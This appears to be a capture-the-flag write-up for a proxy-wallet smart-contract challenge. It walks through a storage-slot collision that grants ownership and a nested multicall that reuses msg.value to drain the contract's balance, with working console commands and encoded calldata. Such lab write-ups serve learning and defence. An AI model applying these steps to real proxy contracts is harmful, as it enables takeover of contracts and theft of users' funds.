# Logic

Pretty sure that you read the documentation of the proxy pattern before reading this, but in case you didn't do, do it :)

Little hint, you can access the function from proxy by using 
```
await contract.sendTransaction({data: <your_data>});
```


# Solution

Well, possibly you didn't find the vulnerability so let's take a look at the contracts. From the documentation we know that the Proxy and the Implementation have the same storage layout. So, as we can see at:

```
| slot      |      proxy     |   contract     |
| --------------------------------------------|
| slot 0    |  pendingAdmin  |     owner      |
| --------------------------------------------|
| slot 1    |      admin     |   maxBalance   |
```

So by changing a variable will actually change 2. Our goal to change the admin involves either changing the `admin` variable or changing the `maxBalance`

We can see that in implementation we don't have access at any function. The majority have the `onlyWhitelisted` modifier, and you are not whitelisted. You can check it by running:
```
await contract.whitelisted(player)
```

To get whitelisted you have to run a `addToWhitelist`, but you have to be the owner. We can't see a function that change the owner in the `PuzzleWallet`, but we see a function that change the `pendingAdmin`, and it is callable by anyone.

You can call it by:
```
await contract.sendTransaction({data: <your_data>});
```
where your_data is obtain by concatenating the function selector and the arguments: "0xa6376746" + `<player_address>`

After running this, you can check the owner of the contract and you will see that it is the address that you introduced above as `<player_address>`

Let's whitelist us, now that we have the owner role:
```
await contract.addToWhitelist(player)
```

After that we can see that we can change the `maxBalance`, atleast we can pass the `onlyWhitelisted` modifier. Let's check the balance of the contract before calling the function:
```
await getBalance(contract.address)
```

As we can see, it is above `0`, so it will fail at the `require(address(this).balance == 0, "Contract balance is not 0");`

Let's drain that contract balance!!!

We can see that a `call` is made from the `execute` function, but we see that we can send only as much as we have in the balance, so we have to make our balance to show more than we actually send, because we want to drain all the funds.

We can do it by calling `multicall` function, as we can see that is vulnerable to reentrancy attacks. We know that when we use delegatecall for multiple function, for each call the msg.value is the same. They made a check for multiple `deposits` in the `data` array, but didn't think of calling `multicall` in a `multicall` with another `deposit` in it.

Let's calculate the data that you have to send
deposit: `0xd0e30db0`
multicall with another deposit: `ac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000`

Also, we have to add the amount that will be deposited. We selected the same amount that was in the contract: `1000000000000000` which is `0.001 ether`

So the call will be:
```
await contract.multicall(["0xd0e30db0", "0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000"], {value: 1000000000000000})
```

Now that our balance appears with `0.002 ether` we can call `execute`
```
await contract.execute(player, 2000000000000000, "0x")
```

The balance is drained now, so let's call the final function, `setMaxBalance`. 

```
await contract.setMaxBalance("<amount>")
```
**where amount is your address converted to uint256**

I deployed a small contract with Remix and made that conversion and copy paste it in the above contract. You can get the contract in `Converter.sol`